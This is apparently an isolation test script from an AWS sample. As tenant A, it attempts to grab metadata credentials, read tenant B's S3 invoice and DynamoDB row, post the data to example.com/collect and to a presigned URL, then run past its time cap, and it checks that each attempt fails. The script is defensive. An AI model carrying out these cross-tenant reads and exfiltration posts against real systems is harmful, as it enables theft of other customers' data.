# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: MIT-0
#
# The hostile "one bad script" job (spec section 8): as tenant A it reads
# tenant B's invoice object and registry row, posts what it has to the
# internet and to a presigned URL, and then runs past the time cap. Every read
# and every post must fail, and the cap must kill it. It prints its findings
# before it spins, so the driver reads them from the killed job's stdout.
import json
import threading
import time

creds = None
try:
    creds = imds_credentials()
except BaseException:  # noqa: BLE001 - no metadata service is the expected case
    creds = None
R["had_credentials"] = creds is not None


def read_invoice_b():
    if creds is None:
        return http("GET", "https://" + CONFIG["bucket"] + ".s3." + CONFIG["region"] + ".amazonaws.com/inputs/" + CONFIG["other"] + "/invoice.csv")[0]
    return s3_request("GET", "inputs/" + CONFIG["other"] + "/invoice.csv", creds)[0]


def read_row_b():
    host = "dynamodb." + CONFIG["region"] + ".amazonaws.com"
    body = json.dumps({"TableName": CONFIG["table"], "Key": {"PK": {"S": "TENANT#" + CONFIG["other"]}, "SK": {"S": "SANDBOX#" + CONFIG["backend"]}}}).encode()
    c = creds or {"ak": "AKIAIOSFODNN7EXAMPLE", "sk": "x", "st": ""}
    h = sigv4("POST", host, "/", CONFIG["region"], "dynamodb", c, body, extra={"Content-Type": "application/x-amz-json-1.0", "X-Amz-Target": "DynamoDB_20120810.GetItem"})
    return http("POST", "https://" + host + "/", h, body)[0]


def post_internet():
    return http("POST", "https://example.com/collect", {"Content-Type": "text/plain"}, b"invoice rows of tenant B")[0]


def post_presigned():
    return http("PUT", CONFIG["presigned"], {}, b"invoice rows of tenant B")[0]


def run(name, fn):
    try:
        R[name] = {"status": fn()}
    except BaseException as e:  # noqa: BLE001
        R[name] = {"error": type(e).__name__}


threads = [threading.Thread(target=run, args=(n, f)) for n, f in
           (("read_invoice_b", read_invoice_b), ("read_row_b", read_row_b), ("post_internet", post_internet), ("post_presigned", post_presigned))]
for t in threads:
    t.start()
join_all(threads)
# Any answer to the post to the internet, or a completed connect to it, means the connection was made;
# a 200 or 204 to a read or the presigned PUT means it worked.
R["leaked"] = any(isinstance(R.get(k), dict) and R[k].get("status") in (200, 204) for k in ("read_invoice_b", "read_row_b", "post_presigned")) \
    or "status" in (R.get("post_internet") or {}) or (R.get("post_internet") or {}).get("error") == "ProbeConnected"
done()
while True:
    time.sleep(1)
